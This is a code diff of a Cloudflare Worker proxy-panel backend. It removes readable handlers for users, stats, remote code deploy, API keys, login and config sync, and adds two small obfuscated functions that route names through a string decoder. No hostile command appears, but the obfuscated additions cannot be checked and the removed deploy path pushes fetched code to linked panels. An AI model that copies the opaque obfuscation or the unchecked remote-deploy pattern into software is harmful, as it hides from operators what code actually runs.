-            await cachedD1Put(env, "sys_config", JSON.stringify(sysConfig));
-            ctx?.waitUntil(
-                logActivity(
-                    env,
-                    "User Deleted",
-                    `User "${deleted.name}" (${userId}) deleted via API`,
-                ).catch(() => {}),
-            );
-            return new Response(
-                JSON.stringify({ success: true, deleted: deleted.id }),
-                { headers: { "Content-Type": "application/json" } },
-            );
-        }
-
-        if (method === "POST" && userId && action === "toggle") {
-            if (!sysConfig.users)
-                return new Response(
-                    JSON.stringify({ success: false, error: "No users" }),
-                    {
-                        status: 400,
-                        headers: { "Content-Type": "application/json" },
-                    },
-                );
-            const u = sysConfig.users.find((usr) => usr.id === userId);
-            if (!u)
-                return new Response(
-                    JSON.stringify({ success: false, error: "User not found" }),
-                    {
-                        status: 404,
-                        headers: { "Content-Type": "application/json" },
-                    },
-                );
-            u.isPaused = !u.isPaused;
-            if (!u.isPaused) {
-                u.disabledReason = null;
-                u.disabledAt = null;
-            }
-            await cachedD1Put(env, "sys_config", JSON.stringify(sysConfig));
-            ctx?.waitUntil(
-                logActivity(
-                    env,
-                    "User Toggled",
-                    `User "${u.name}" (${userId}) ${u.isPaused ? "paused" : "resumed"} via API`,
-                ).catch(() => {}),
-            );
-            return new Response(JSON.stringify({ success: true, user: u }), {
-                headers: { "Content-Type": "application/json" },
-            });
-        }
-
-        if (method === "POST" && userId && action === "reset") {
-            if (!sysUsageCache) sysUsageCache = { users: {} };
-            if (!sysUsageCache.users) sysUsageCache.users = {};
-            const uuidClean = userId.replace(/-/g, "").toLowerCase();
-            if (sysUsageCache.users[uuidClean]) {
-                sysUsageCache.users[uuidClean].reqs = 0;
-                sysUsageCache.users[uuidClean].dReqs = 0;
-            } else {
-                sysUsageCache.users[uuidClean] = {
-                    reqs: 0,
-                    dReqs: 0,
-                    lastDay: new Date().toISOString().split("T")[0],
-                };
-            }
-            await cachedD1Put(env, "sys_usage", JSON.stringify(sysUsageCache));
-            ctx?.waitUntil(
-                logActivity(
-                    env,
-                    "Traffic Reset",
-                    `Traffic reset for user ${userId} via API`,
-                ).catch(() => {}),
-            );
-            return new Response(
-                JSON.stringify({ success: true, message: "Traffic reset" }),
-                { headers: { "Content-Type": "application/json" } },
-            );
-        }
-
-        return new Response(
-            JSON.stringify({ success: false, error: "Invalid request" }),
-            { status: 400, headers: { "Content-Type": "application/json" } },
-        );
-    } catch (e) {
-        return new Response(
-            JSON.stringify({ success: false, error: e.message }),
-            { status: 500, headers: { "Content-Type": "application/json" } },
-        );
-    }
-}
-
-// Relay health snapshot for /api/stats (agency monitoring parity with
-// Sepidar /api/health): quarantine + graveyard + AI quarantine. Read-only,
-// memory + 2 cached D1 reads at most; never throws.
-function relayHealthSnapshot() {
-    const out = { quarantined: [], graveyard: [], aiQuarantine: [] };
-    try {
-        const now = Date.now();
-        for (const [k, e] of RELAY_Q) {
-            if (e && e.until && e.until > now) out.quarantined.push(k);
-        }
-    } catch (e) {}
-    try {
-        for (const [k, e] of AI_RELAY_Q) {
-            if (e && e.until && Date.now() < e.until)
-                out.aiQuarantine.push(k);
-        }
-    } catch (e) {}
-    return out;
-}
-async function relayHealthSnapshotAsync(env) {
-    const out = relayHealthSnapshot();
-    try {
-        if (env && env.IOT_DB) {
-            const g = JSON.parse(
-                (await d1Get(env, "relay_graveyard")) || "{}",
-            );
-            for (const [k, e] of Object.entries(g || {})) {
-                out.graveyard.push({
-                    key: k,
-                    streak: (e && e.healthyStreak) || 0,
-                    unstable: !!(e && e.unstable),
-                    lists: (e && e.lists && e.lists.length) || 0,
-                });
-            }
-        }
-    } catch (e) {}
-    return out;
-}
-async function handleStatsApi(request, env) {    try {
-        const url = new URL(request.url);
-        const authHeader = request.headers.get("Authorization") || "";
-        const authKey =
-            authHeader.replace("Bearer ", "") ||
-            url.searchParams.get("key") ||
-            "";
-        const statsGateIp =
-            request.headers.get("cf-connecting-ip") || "Unknown";
-        if (authBlocked(statsGateIp)) {
-            return new Response(
-                JSON.stringify({ success: false, error: "Too many attempts" }),
-                {
-                    status: 429,
-                    headers: { "Content-Type": "application/json" },
-                },
-            );
-        }
-        if (authKey !== sysConfig.masterKey && !isPanelApiKey(authKey)) {
-            authFail(statsGateIp);
-            return new Response(
-                JSON.stringify({ success: false, error: "Unauthorized" }),
-                {
-                    status: 401,
-                    headers: { "Content-Type": "application/json" },
-                },
-            );
-        }
-
-        const users = sysConfig.users || [];
-        const totalUsers = users.length;
-        const activeUsers = users.filter(
-            (u) => !u.isPaused && (!u.expiryMs || Date.now() <= u.expiryMs),
-        ).length;
-        const autoDisabledUsers = users.filter(
-            (u) => u.isPaused && u.disabledReason,
-        ).length;
-        const pausedUsers = users.filter(
-            (u) => u.isPaused && !u.disabledReason,
-        ).length;
-        const expiredUsers = users.filter(
-            (u) => u.expiryMs && Date.now() > u.expiryMs && !u.isPaused,
-        ).length;
-
-        let totalTrafficReqs = 0;
-        let dailyTrafficReqs = 0;
-        let totalTrafficBytes = 0;
-        let dailyTrafficBytes = 0;
-        const todayDate = new Date().toISOString().split("T")[0];
-        users.forEach((u) => {
-            const idClean = u.id.replace(/-/g, "").toLowerCase();
-            const sysU = sysUsageCache?.users?.[idClean] || {
-                reqs: 0,
-                dReqs: 0,
-                lastDay: "",
-            };
-            totalTrafficReqs += sysU.reqs || 0;
-            if (sysU.lastDay === todayDate) dailyTrafficReqs += sysU.dReqs || 0;
-            totalTrafficBytes += usageTotalBytes(sysU);
-            dailyTrafficBytes += usageDailyBytes(sysU, todayDate);
-        });
-
-        
-        let usageData = {};
-        for (let [k, v] of uuidUsage.entries()) {
-            usageData[k] = { ...v, connects: activeConns.get(k) || 0 };
-        }
-        const upSeconds = Math.floor((Date.now() - isolateStartTime) / 1000);
-
-        return new Response(
-            JSON.stringify({
-                success: true,
-                stats: {
-                    users: {
-                        total: totalUsers,
-                        active: activeUsers,
-                        paused: pausedUsers,
-                        expired: expiredUsers,
-                        autoDisabled: autoDisabledUsers,
-                    },
-                    traffic: {
-                        totalRequests: totalTrafficReqs,
-                        totalGB: (totalTrafficBytes / 1073741824).toFixed(2),
-                        dailyRequests: dailyTrafficReqs,
-                        dailyGB: (dailyTrafficBytes / 1073741824).toFixed(2),
-                    },
-                    usage: usageData,
-                    system: {
-                        uptimeSeconds: upSeconds,
-                        activeConnections,
-                        version: CURRENT_VERSION,
-                        isPaused: sysConfig.isPaused || false,
-                        security: {
-                            usingDefaultKey:
-                                sysConfig.masterKey === "admin",
-                        },
-                    },
-                    relays: await relayHealthSnapshotAsync(env),
-                },
-            }),
-            { headers: { "Content-Type": "application/json" } },
-        );
-    } catch (e) {
-        return new Response(
-            JSON.stringify({ success: false, error: e.message }),
-            { status: 500, headers: { "Content-Type": "application/json" } },
-        );
-    }
-}
-
-
-
-function cmpVersions(a, b) {
-    const strip = (v) => String(v).replace(/^v/, "").trim();
-    const pa = strip(a).split(".").map(Number);
-    const pb = strip(b).split(".").map(Number);
-    for (let i = 0; i < Math.max(pa.length, pb.length); i++) {
-        let na = pa[i] || 0,
-            nb = pb[i] || 0;
-        if (na > nb) return 1;
-        if (nb > na) return -1;
-    }
+function func_g(var_cn, var_co) {
+  try {
+    if (!var_cn) return 0;
+    const var_cp = var_co || new Date()[func_dec(19)]()[func_dec(18)](func_dec(20))[0];
+    if ((var_cn[func_dec(21)] || func_dec(3)) !== var_cp) return 0;
+    if (typeof var_cn[func_dec(22)] === func_dec(15) && var_cn[func_dec(22)] >= 0) return Math[func_dec(16)](var_cn[func_dec(22)]);
+    return Math[func_dec(16)]((var_cn[func_dec(23)] || 0) * var_b);
+  } catch (var_cq) {
     return 0;
+  }
 }
-
-async function handleUpdateApi(request, env, ctx) {
-    try {
-        if (request.method !== "POST")
-            return new Response("405", { status: 405 });
-        const data = await request.json();
-        const deployKey = extractAuthKey(request, data);
-        const deployGateIp =
-            request.headers.get("cf-connecting-ip") || "Unknown";
-        if (authBlocked(deployGateIp)) {
-            return new Response(
-                JSON.stringify({ success: false, error: "Too many attempts" }),
-                {
-                    status: 429,
-                    headers: { "Content-Type": "application/json" },
-                },
-            );
-        }
-        if (deployKey !== sysConfig.masterKey) {
-            authFail(deployGateIp);
-            return new Response(
-                JSON.stringify({ success: false, error: "Unauthorized" }),
-                {
-                    status: 401,
-                    headers: { "Content-Type": "application/json" },
-                },
-            );
-        }
-
-        const accountId = sysConfig.cfAccountId;
-        const apiToken = sysConfig.cfApiToken;
-        const workerName = sysConfig.cfWorkerName;
-        const repo = (sysConfig.githubRepo || "itsyebekhe/nahan")
-            .replace(/https?:\/\/github\.com\//, "")
-            .trim();
-
-        if (data.action === "check") {
-            let remoteVer = null;
-            try {
-                const res = await fetchT(
-                    `https://raw.githubusercontent.com/${repo}/main/version`,
-                );
-                if (res.ok) {
-                    const txt = (await res.text()).trim();
-                    if (txt && txt.length <= 15) remoteVer = txt;
-                }
-            } catch (e) {}
-            if (!remoteVer) {
-                try {
-                    let res = await fetchT(
-                        `https://raw.githubusercontent.com/${repo}/main/_worker.encode.js`,
-                    );
-                    if (!res.ok) {
-                        res = await fetchT(
-                            `https://raw.githubusercontent.com/${repo}/main/_worker.encoded.js`,
-                        );
-                        if (!res.ok) {
-                            res = await fetchT(
-                                `https://raw.githubusercontent.com/${repo}/main/_worker.js`,
-                            );
-                        }
-                    }
-                    if (res.ok) {
-                        const code = await res.text();
-                        const match = code.match(
-                            /const\s+CURRENT_VERSION\s*=\s*["']([^"']+)["']/,
-                        );
-                        if (match) remoteVer = match[1];
-                    }
-                } catch (e) {}
-            }
-            if (!remoteVer) {
-                return new Response(
-                    JSON.stringify({
-                        success: false,
-                        error: "Could not fetch remote version",
-                    }),
-                    {
-                        status: 502,
-                        headers: { "Content-Type": "application/json" },
-                    },
-                );
-            }
-            const hasCredentials = !!(accountId && apiToken && workerName);
-            return new Response(
-                JSON.stringify({
-                    success: true,
-                    current: CURRENT_VERSION,
-                    latest: remoteVer,
-                    updateAvailable:
-                        cmpVersions(CURRENT_VERSION, remoteVer) < 0,
-                    canDeploy: hasCredentials,
-                }),
-                { headers: { "Content-Type": "application/json" } },
-            );
-        }
-
-        if (data.action === "deploy") {
-            // Remote-code-execution gate: deploying worker code with only
-            // the panel key is disabled unless the operator explicitly opts
-            // in (POST {"key":...,"config":{"allowRemoteDeploy":true}} to
-            // /api/sync). Version *check* above stays available.
-            if (sysConfig.allowRemoteDeploy !== true) {
-                return new Response(
-                    JSON.stringify({
-                        success: false,
-                        error: "Remote deploy is disabled. Enable allowRemoteDeploy in config to use it.",
-                    }),
-                    {
-                        status: 403,
-                        headers: { "Content-Type": "application/json" },
-                    },
-                );
-            }
-            if (!accountId || !apiToken || !workerName) {
-                return new Response(
-                    JSON.stringify({
-                        success: false,
-                        error: "CF credentials not configured",
-                    }),
-                    {
-                        status: 400,
-                        headers: { "Content-Type": "application/json" },
-                    },
-                );
-            }
-
-            let newVersion = data.version || null;
-
-            let finalCodeToDeploy = data.code;
-            if (!finalCodeToDeploy) {
-                try {
-                    let res = await fetchT(
-                        `https://raw.githubusercontent.com/${repo}/main/_worker.encode.js`,
-                    );
-                    if (!res.ok) {
-                        res = await fetchT(
-                            `https://raw.githubusercontent.com/${repo}/main/_worker.encoded.js`,
-                        );
-                        if (!res.ok) {
-                            res = await fetchT(
-                                `https://raw.githubusercontent.com/${repo}/main/_worker.js`,
-                            );
-                        }
-                    }
-                    if (!res.ok) throw new Error(`HTTP ${res.status}`);
-                    finalCodeToDeploy = await res.text();
-                } catch (e) {
-                    return new Response(
-                        JSON.stringify({
-                            success: false,
-                            error: "Failed to fetch from GitHub: " + e.message,
-                        }),
-                        {
-                            status: 502,
-                            headers: { "Content-Type": "application/json" },
-                        },
-                    );
-                }
-            }
-
-            if (!newVersion) {
-                const versionMatch = finalCodeToDeploy.match(
-                    /const\s+CURRENT_VERSION\s*=\s*["']([^"']+)["']/,
-                );
-                if (versionMatch) {
-                    newVersion = versionMatch[1];
-                } else {
-                    try {
-                        const vRes = await fetchT(
-                            `https://raw.githubusercontent.com/${repo}/main/version`,
-                        );
-                        if (vRes.ok) {
-                            newVersion = (await vRes.text()).trim();
-                        }
-                    } catch (e) {}
-                }
-            }
-            if (!newVersion) newVersion = CURRENT_VERSION;
-
-            if (
-                cmpVersions(CURRENT_VERSION, newVersion) >= 0 &&
-                !data.force &&
-                !data.code
-            ) {
-                return new Response(
-                    JSON.stringify({
-                        success: false,
-                        error: "Remote version is not newer. Click force redeploy to overwrite.",
-                    }),
-                    {
-                        status: 400,
-                        headers: { "Content-Type": "application/json" },
-                    },
-                );
-            }
-
-            const deployRes = await deployWorkerToCloudflare(
-                accountId,
-                apiToken,
-                workerName,
-                finalCodeToDeploy,
-            );
-            const deployResult = await deployRes.json();
-
-            if (deployResult.success) {
-                ctx?.waitUntil(
-                    logActivity(
-                        env,
-                        "Panel Updated",
-                        `v${CURRENT_VERSION} → v${newVersion} (encoded)`,
-                    ).catch(() => {}),
-                );
-
-                // Update all nodes with main panel update!
-                if (sysConfig.linkedPanels && Array.isArray(sysConfig.linkedPanels)) {
-                    for (const p of sysConfig.linkedPanels) {
-                        if (p && p.url && p.apiKey) {
-                            let cleanUrl = p.url.trim();
-                            if (!cleanUrl.startsWith("http://") && !cleanUrl.startsWith("https://")) {
-                                cleanUrl = "https://" + cleanUrl;
-                            }
-                            try {
-                                const parsed = new URL(cleanUrl);
-                                const targetUrl = `${parsed.protocol}//${parsed.host}/${encodeURI(sysConfig.apiRoute)}/api/update`;
-                                ctx?.waitUntil(
-                                    fetchT(targetUrl, {
-                                        method: "POST",
-                                        headers: { "Content-Type": "application/json" },
-                                        body: JSON.stringify({
-                                            key: p.apiKey,
-                                            action: "deploy",
-                                            code: finalCodeToDeploy,
-                                            force: true
-                                        }),
-                                        signal: AbortSignal.timeout(15000)
-                                    }).then(async (r) => {
-                                        const resJson = await r.json();
-                                        await logActivity(env, "Node Update Success", `Node ${p.url} update response: ${JSON.stringify(resJson)}`);
-                                    }).catch((e) => {
-                                        logActivity(env, "Node Update Failed", `Node ${p.url} update failed: ${e.message}`);
-                                    })
-                                );
-                            } catch (err) {
-                                console.error(`Failed to trigger update on node ${p.url}:`, err);
-                            }
-                        }
-                    }
-                }
-
-                if (
-                    sysConfig.tgToken &&
-                    (sysConfig.tgAdminId || sysConfig.tgChatId)
-                ) {
-                    const tgMsg = `🔄 <b>Panel Updated</b>\n\n📦 v${CURRENT_VERSION} → v${newVersion}\n🌐 <b>Format:</b> encoded`;
-                    const notifyChatId =
-                        sysConfig.tgAdminId || sysConfig.tgChatId;
-                    ctx?.waitUntil(
-                        fetchT(
-                            `https://api.telegram.org/bot${sysConfig.tgToken}/sendMessage`,
-                            {
-                                method: "POST",
-                                headers: { "Content-Type": "application/json" },
-                                body: JSON.stringify({
-                                    chat_id: notifyChatId,
-                                    text: tgMsg,
-                                    parse_mode: "HTML",
-                                }),
-                            },
-                        ).catch(() => {}),
-                    );
-                }
-                return new Response(
-                    JSON.stringify({
-                        success: true,
-                        message: `Updated to v${newVersion}`,
-                        newVersion,
-                    }),
-                    { headers: { "Content-Type": "application/json" } },
-                );
-            } else {
-                const errMsg =
-                    deployResult.errors?.[0]?.message || "Unknown API error";
-                return new Response(
-                    JSON.stringify({
-                        success: false,
-                        error: "Cloudflare API: " + errMsg,
-                    }),
-                    {
-                        status: 502,
-                        headers: { "Content-Type": "application/json" },
-                    },
-                );
-            }
-        }
-
-        return new Response(
-            JSON.stringify({ success: false, error: "Invalid action" }),
-            { status: 400, headers: { "Content-Type": "application/json" } },
-        );
-    } catch (e) {
-        return new Response(
-            JSON.stringify({ success: false, error: "Internal error" }),
-            { status: 500, headers: { "Content-Type": "application/json" } },
-        );
-    }
+function func_h(var_cr) {
+  try {
+    return var_cr ? Math[func_dec(16)](var_cr * var_b) : 0;
+  } catch (var_cs) {
+    return 0;
+  }
 }
-
-async function handleApiKeys(request, env, ctx) {
-    try {
-        const url = new URL(request.url);
-        const method = request.method;
-
-        const authKey = extractAuthKey(request, null);
-        const keysGateIp =
-            request.headers.get("cf-connecting-ip") || "Unknown";
-        if (authBlocked(keysGateIp)) {
-            return new Response(
-                JSON.stringify({ success: false, error: "Too many attempts" }),
-                {
-                    status: 429,
-                    headers: { "Content-Type": "application/json" },
-                },
-            );
-        }
-        if (authKey !== sysConfig.masterKey) {
-            authFail(keysGateIp);
-            return new Response(
-                JSON.stringify({
-                    success: false,
-                    error: "Only master key can manage API keys",
-                }),
-                {
-                    status: 401,
-                    headers: { "Content-Type": "application/json" },
-                },
-            );
-        }
-
-        if (method === "GET") {
-            const keys = (sysConfig.panelApiKeys || []).map((k) => ({
-                id: k.id,
-                name: k.name,
-                keyPreview: k.key.slice(0, 8) + "..." + k.key.slice(-4),
-                createdAt: k.createdAt,
-                lastUsed: k.lastUsed,
-            }));
-            return new Response(JSON.stringify({ success: true, keys }), {
-                headers: { "Content-Type": "application/json" },
-            });
-        }
-
-        if (method === "POST") {
-            const body = await request.json();
-            if (body.action === "create") {
-                if (!sysConfig.panelApiKeys) sysConfig.panelApiKeys = [];
-                if (sysConfig.panelApiKeys.length >= 10) {
-                    return new Response(
-                        JSON.stringify({
-                            success: false,
-                            error: "Maximum 10 API keys allowed",
-                        }),
-                        {
-                            status: 400,
-                            headers: { "Content-Type": "application/json" },
-                        },
-                    );
-                }
-                const newKey = generateApiKey(body.name);
-                sysConfig.panelApiKeys.push(newKey);
-                await cachedD1Put(env, "sys_config", JSON.stringify(sysConfig));
-                ctx?.waitUntil(
-                    logActivity(
-                        env,
-                        "API Key Created",
-                        `Key "${newKey.name}" created`,
-                    ).catch(() => {}),
-                );
-                return new Response(
-                    JSON.stringify({ success: true, key: newKey }),
-                    {
-                        status: 201,
-                        headers: { "Content-Type": "application/json" },
-                    },
-                );
-            }
-            if (body.action === "revoke") {
-                if (!body.id)
-                    return new Response(
-                        JSON.stringify({
-                            success: false,
-                            error: "ID required",
-                        }),
-                        {
-                            status: 400,
-                            headers: { "Content-Type": "application/json" },
-                        },
-                    );
-                const idx = (sysConfig.panelApiKeys || []).findIndex(
-                    (k) => k.id === body.id,
-                );
-                if (idx === -1)
-                    return new Response(
-                        JSON.stringify({
-                            success: false,
-                            error: "Key not found",
-                        }),
-                        {
-                            status: 404,
-                            headers: { "Content-Type": "application/json" },
-                        },
-                    );
-                const revoked = sysConfig.panelApiKeys.splice(idx, 1)[0];
-                await cachedD1Put(env, "sys_config", JSON.stringify(sysConfig));
-                ctx?.waitUntil(
-                    logActivity(
-                        env,
-                        "API Key Revoked",
-                        `Key "${revoked.name}" revoked`,
-                    ).catch(() => {}),
-                );
-                return new Response(
-                    JSON.stringify({ success: true, revoked: revoked.id }),
-                    { headers: { "Content-Type": "application/json" } },
-                );
-            }
-        }
-
-        return new Response(
-            JSON.stringify({ success: false, error: "Invalid request" }),
-            { status: 400, headers: { "Content-Type": "application/json" } },
-        );
-    } catch (e) {
-        return new Response(
-            JSON.stringify({ success: false, error: e.message }),
-            { status: 500, headers: { "Content-Type": "application/json" } },
-        );
-    }
-}
-
-async function handleAuth(request, hostName, ctx, env) {
-    try {
-        const data = await request.json();
-        const ip = request.headers.get("cf-connecting-ip") || "Unknown";
-        if (authBlocked(ip)) {
-            return new Response(
-                JSON.stringify({
-                    success: false,
-                    error: "Too many attempts, try later",
-                }),
-                { status: 429 },
-            );
-        }
-        const loginKey = data.key || "";
-        const isKeyAuth =
-            loginKey === sysConfig.masterKey || isPanelApiKey(loginKey);
-        if (isKeyAuth) {
-            authClear(ip);
-            if (isPanelApiKey(loginKey)) {
-                const apiKeyEntry = (sysConfig.panelApiKeys || []).find(
-                    (k) => k.key === loginKey,
-                );
-                if (apiKeyEntry) apiKeyEntry.lastUsed = Date.now();
-            }
-            ctx?.waitUntil(
-                logActivity(
-                    env,
-                    "Auth Success",
-                    `Successful panel login from ${ip} (via ${isPanelApiKey(loginKey) ? "API Key" : "Master Key"})`,
-                ),
-            );
-            if (!sysConfig.silentAlerts && ctx)
-                ctx.waitUntil(
-                    sendTelegramMessage(
-                        request,
-                        "ورود به پنل (موفق)",
-                        hostName,
-                    ),
-                );
-
-            // Store login signal for Telegram bot
-            if (sysConfig.tgAdminId && env.IOT_DB) {
-                const loginSignal = {
-                    name: sysConfig.name || hostName,
-                    host: hostName,
-                    apiRoute: sysConfig.apiRoute,
-                    masterKey: sysConfig.masterKey,
-                    isLocal: true,
-                    ts: Date.now(),
-                };
-                ctx?.waitUntil(
-                    d1Put(
-                        env,
-                        "tg_panel_login",
-                        JSON.stringify(loginSignal),
-                    ).catch(() => {}),
-                );
-            }
-
-            // Notify hub panel if configured
-            if (
-                sysConfig.hubPanelUrl &&
-                sysConfig.hubPanelUrl.trim() &&
-                sysConfig.tgAdminId
-            ) {
-                try {
-                    let hubUrl = sysConfig.hubPanelUrl.trim();
-                    if (!hubUrl.startsWith("http"))
-                        hubUrl = "https://" + hubUrl;
-                    const signalPayload = {
-                        signal: "panel_login",
-                        panelName: sysConfig.name || hostName,
-                        panelHost: hostName,
-                        panelApiRoute: sysConfig.apiRoute,
-                        tgAdminId: sysConfig.tgAdminId,
-                        ts: Date.now(),
-                    };
-                    ctx?.waitUntil(
-                        fetchT(
-                            `${hubUrl}/${encodeURI(sysConfig.apiRoute)}/tg/sync_panel`,
-                            {
-                                method: "POST",
-                                headers: { "Content-Type": "application/json" },
-                                body: JSON.stringify(signalPayload),
-                            },
-                        ).catch(() => {}),
-                    );
-                } catch (e) {}
-            }
-
-            const netInfo = {
-                ip: ip,
-                colo: request.cf?.colo || "Unknown",
-                loc:
-                    (request.cf?.city || "Unknown") +
-                    ", " +
-                    (request.cf?.country || "Unknown"),
-            };
-            let usageData = {};
-            for (let [k, v] of uuidUsage.entries()) usageData[k] = { ...v, connects: activeConns.get(k) || 0 };
-            let baseHost = hostName;
-            let protocol = "https";
-            if (sysConfig.customPanelUrl && sysConfig.customPanelUrl.trim()) {
-                let customUrlStr = sysConfig.customPanelUrl.trim();
-                if (
-                    !customUrlStr.startsWith("http://") &&
-                    !customUrlStr.startsWith("https://")
-                ) {
-                    customUrlStr = "https://" + customUrlStr;
-                }
-                try {
-                    const customUrl = new URL(customUrlStr);
-                    baseHost = customUrl.host;
-                    protocol = customUrl.protocol.replace(":", "");
-                } catch (e) {}
-            }
-            return new Response(
-                JSON.stringify({
-                    success: true,
-                    config: isPanelApiKey(loginKey)
-                        ? {
-                              ...sysConfig,
-                              masterKey: "[PROTECTED]",
-                              panelApiKeys: "[PROTECTED]",
-                              cfApiToken: "[PROTECTED]",
-                              cfAccountId: "[PROTECTED]",
-                              cfWorkerName: "[PROTECTED]",
-                              tgToken: "[PROTECTED]",
-                              tgChatId: "[PROTECTED]",
-                              tgAdminId: "[PROTECTED]",
-                              syncApiKey: "[PROTECTED]",
-                          }
-                        : sysConfig,
-                    deviceId: activeDeviceId,
-                    network: netInfo,
-                    usage: usageData,
-                    sysUsage:
-                        sysUsageCache && sysUsageCache.users
-                            ? sysUsageCache.users
-                            : {},
-                    version: CURRENT_VERSION,
-                    profiles: getAllProfiles().map((p) => {
-                        let subSuffix =
-                            p.name === "Default"
-                                ? ""
-                                : "?sub=" + encodeURIComponent(p.name);
-                        return {
-                            name: p.name,
-                            id: p.id,
-                            sync: `${protocol}://${baseHost}/${sysConfig.apiRoute}${subSuffix}`,
-                        };
-                    }),
-                }),
-                { status: 200 },
-            );
-        }
-        ctx?.waitUntil(
-            logActivity(env, "Auth Failed", `Failed login attempt from ${ip}`),
-        );
-        authFail(ip);
-        if (ctx)
-            ctx.waitUntil(
-                sendTelegramMessage(
-                    request,
-                    "تلاش ناموفق ورود به پنل!",
-                    hostName,
-                ),
-            );
-        return new Response(JSON.stringify({ success: false }), {
-            status: 401,
-        });
-    } catch (e) {
-        return new Response(JSON.stringify({ success: false }), {
-            status: 400,
-        });
-    }
-}
-
-async function handleConfigSync(request, env, ctx) {
-    try {
-        const data = await request.json();
-        const syncGateIp =
-            request.headers.get("cf-connecting-ip") || "Unknown";
-        if (authBlocked(syncGateIp)) {
-            return new Response(
-                JSON.stringify({
-                    success: false,
-                    error: "Too many attempts",
-                }),
-                { status: 429 },
-            );
-        }
-        const isAuthSync =
-            data.key === sysConfig.masterKey ||
-            (data.oldKey && data.oldKey === sysConfig.masterKey) ||
-            isPanelApiKey(data.key) ||
-            isPanelApiKey(data.oldKey) ||
-            (data.fromMaster &&
-                data.config &&
-                data.config.masterKey &&
-                data.config.masterKey === sysConfig.masterKey);
-        if (!isAuthSync) {
-            authFail(syncGateIp);
-            return new Response(
-                JSON.stringify({
-                    success: false,
-                    error: "Auth failed. Generate the API key on THIS panel, not the main panel.",
-                }),
-                { status: 401 },
-            );
-        }
-        if (!env.IOT_DB)
-            return new Response(
-                JSON.stringify({ success: false, msg: "DB Error" }),
-                { status: 400 },
-            );
-
-        let nextConfig = sysConfig;
-        if (data.config) {
-            const preserveApiKeys = sysConfig.panelApiKeys || [];
-            nextConfig = { ...sysConfig, ...data.config };
-            if (Array.isArray(nextConfig.users)) {
-                nextConfig.users = nextConfig.users.map(u => ({...u}));
-            }
-            if (
-                preserveApiKeys.length > 0 &&
-                (!data.config.panelApiKeys ||
-                    data.config.panelApiKeys.length === 0)
-            ) {
-                nextConfig.panelApiKeys = preserveApiKeys;
-            }
-            migrateSlaveNodesToLinkedPanels(nextConfig);
-            if (
-                Array.isArray(nextConfig.users) &&
-                nextConfig.users.length > 0
-            ) {
-                const geoPromises = nextConfig.users.map(async (u) => {
-                    if (u.proxyIp) {
-                        await resolveUserProxyIpGeo(u);
-                    } else {
-                        u.proxyIpGeo = null;
-                    }
-                });
-                await Promise.all(geoPromises);
-            }
-            sysConfig = nextConfig;
-            await cachedD1Put(env, "sys_config", JSON.stringify(nextConfig));
-        }
-
-        let tagWarning = null;
-        if (
-            nextConfig.nameStrategy &&
-            nextConfig.nameStrategy.includes("{") &&
-            nextConfig.nameStrategy.includes("}")
-        ) {
-            let vResult = validateNameStrategy(nextConfig.nameStrategy);
-            if (!vResult.valid)
-                tagWarning = `Unknown tags detected: ${vResult.unknownTags.join(", ")}`;
-        }
-
-        if (data.resetUUID) {
-            const uuidClean = data.resetUUID.replace(/-/g, "").toLowerCase();
-            if (!sysUsageCache) sysUsageCache = { users: {} };
-            if (!sysUsageCache.users) sysUsageCache.users = {};
-            if (sysUsageCache.users[uuidClean]) {
-                sysUsageCache.users[uuidClean].reqs = 0;
-                sysUsageCache.users[uuidClean].dReqs = 0;
-            } else {
-                sysUsageCache.users[uuidClean] = {
-                    reqs: 0,
-                    dReqs: 0,
-                    lastDay: new Date().toISOString().split("T")[0],
-                };
-            }
-            await cachedD1Put(env, "sys_usage", JSON.stringify(sysUsageCache));
-        }
-
-        if (data.config && !data.fromMaster) {
-            let currentHost = new URL(request.url).hostname;
-            let slaveConfig = { ...nextConfig };
-            [
-                "cfAccountId",
-                "cfApiToken",
-                "cfWorkerName",
-                "tgToken",
-                "tgChatId",
-                "tgAdminId",
-                "masterKey",
-                "syncApiKey",
-                "apiRoute",
-                "deviceId",
-                "panelApiKeys",
-                "hubPanelUrl",
-                "linkedPanels",
-                "slaveNodes",
-                "githubRepo",
-                "customPanelUrl"
-            ].forEach((k) => delete slaveConfig[k]);
-
-            // Propagate config to slaveNodes
-            if (nextConfig.slaveNodes && nextConfig.slaveNodes.trim().length > 0) {
-                let nodes = nextConfig.slaveNodes
-                    .split(/[\r\n,;]+/)
-                    .map((s) => s.trim())
-                    .filter(Boolean);
-                let syncKey = nextConfig.syncApiKey || "";
-                nodes.forEach((node) => {
-                    if (node !== currentHost) {
-                        ctx?.waitUntil(
-                            fetchT(
-                                `https://${node}/${encodeURI(nextConfig.apiRoute)}/api/sync`,
-                                {
-                                    method: "POST",
-                                    headers: { "Content-Type": "application/json" },
-                                    body: JSON.stringify({
-                                        key: syncKey,
-                                        config: slaveConfig,
-                                        fromMaster: true,
-                                    }),
-                                },
-                            ).catch(() => {}),
-                        );
-                    }
-                });
-            }
-
-            // Propagate config to linkedPanels
-            if (nextConfig.linkedPanels && Array.isArray(nextConfig.linkedPanels)) {
-                nextConfig.linkedPanels.forEach((p) => {
-                    if (p && p.url && p.apiKey) {
-                        let cleanUrl = p.url.trim();
-                        if (!cleanUrl.startsWith("http://") && !cleanUrl.startsWith("https://")) {
-                            cleanUrl = "https://" + cleanUrl;
-                        }
-                        try {
-                            const parsed = new URL(cleanUrl);
-                            if (parsed.hostname !== currentHost) {
-                                ctx?.waitUntil(
-                                    fetchT(
-                                        `${parsed.protocol}//${parsed.host}/${encodeURI(nextConfig.apiRoute)}/api/sync`,
-                                        {
-                                            method: "POST",
-                                            headers: { "Content-Type": "application/json" },
-                                            body: JSON.stringify({
-                                                key: p.apiKey,
-                                                config: slaveConfig,
-                                                fromMaster: true,
-                                            }),
-                                        },
-                                    ).catch(() => {}),
-                                );
-                            }
-                        } catch (err) {
-                            console.error(`Failed to propagate config to linked panel ${p.url}:`, err);
-                        }
-                    }
-                });
-            }
-        }
-
-        if (nextConfig.tgToken && ctx) {
-            const hookUrl = `https://${new URL(request.url).hostname}/${encodeURI(nextConfig.apiRoute)}/tg`;
-            ctx.waitUntil(
-                fetchT(
-                    `https://api.telegram.org/bot${nextConfig.tgToken}/setWebhook`,
-                    {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ url: hookUrl }),
-                    },
-                ).catch(() => {}),
-            );
-        }
-
-        return new Response(
-            JSON.stringify({
-                success: true,
-                newRoute: nextConfig.apiRoute,
-                tagWarning,
-            }),
-            { status: 200 },
-        );
-    } catch (e) {
-        return new Response(JSON.stringify({ success: false }), {
-            status: 400,
-        });
-    }
-}
-
